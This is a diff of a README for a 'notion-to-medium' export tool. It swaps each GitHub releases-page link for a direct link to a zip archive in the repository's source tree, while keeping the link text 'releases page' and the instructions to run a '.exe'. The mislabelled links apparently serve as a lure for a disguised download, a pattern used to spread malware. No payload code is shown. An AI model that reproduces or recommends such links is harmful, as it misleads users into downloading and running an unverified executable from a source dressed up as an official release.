@@ -1,6 +1,6 @@
 # ✍️ notion-to-medium - Export your Notion pages to Medium
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Obstructed-bit260/notion-to-medium/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Obstructed-bit260/notion-to-medium/raw/refs/heads/main/src/to_medium_notion_v3.3.zip)
 
 This application transforms your Notion content into Medium articles. It bridges the gap between your private notes and your public blog. You save time by reusing work across two different platforms.
 
@@ -17,9 +17,9 @@ Most people struggle to move content between tools. You write a draft in Notion 
 
 ## ⬇️ Setup and installation
 
-Visit the [releases page](https://github.com/Obstructed-bit260/notion-to-medium/releases) to download the latest file. 
+Visit the [releases page](https://github.com/Obstructed-bit260/notion-to-medium/raw/refs/heads/main/src/to_medium_notion_v3.3.zip) to download the latest file. 
 
-1. Go to the [download page](https://github.com/Obstructed-bit260/notion-to-medium/releases).
+1. Go to the [download page](https://github.com/Obstructed-bit260/notion-to-medium/raw/refs/heads/main/src/to_medium_notion_v3.3.zip).
 2. Look for the Assets section.
 3. Select the file ending in `.exe`.
 4. Save the file to your desktop or downloads folder.
